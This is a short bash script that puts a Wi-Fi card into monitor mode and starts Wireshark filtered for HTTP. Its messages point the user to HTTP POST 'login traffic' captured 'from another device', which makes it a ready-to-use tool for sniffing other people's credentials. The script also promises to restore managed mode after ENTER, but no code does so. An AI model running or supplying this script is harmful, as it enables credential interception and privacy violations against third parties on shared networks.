#!/bin/bash

# Automatically detect a wireless interface that supports monitor mode
echo "[+] Detecting wireless interface..."
WIFI_IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)

if [[ -z "$WIFI_IFACE" ]]; then
  echo "[!] No wireless interface found. Exiting."
  exit 1
fi

echo "[+] Found wireless interface: $WIFI_IFACE"

# Enable monitor mode
echo "[+] Enabling monitor mode on $WIFI_IFACE..."
sudo ip link set $WIFI_IFACE down
sudo iw $WIFI_IFACE set monitor control
sudo ip link set $WIFI_IFACE up

# Confirm interface name (sometimes becomes wlan0mon, but here we keep original)
echo "[✓] $WIFI_IFACE is now in monitor mode."

# Start Wireshark with HTTP filter
echo "[+] Launching Wireshark (http filter)..."
echo "[i] Use 'http.request.method == \"POST\"' to filter login traffic."
sudo wireshark -k -Y "http" -i $WIFI_IFACE &

echo "[✓] Wireshark is running. Capture HTTP POST traffic from another device."
read -p "Press ENTER to stop monitoring and restore managed mode..."


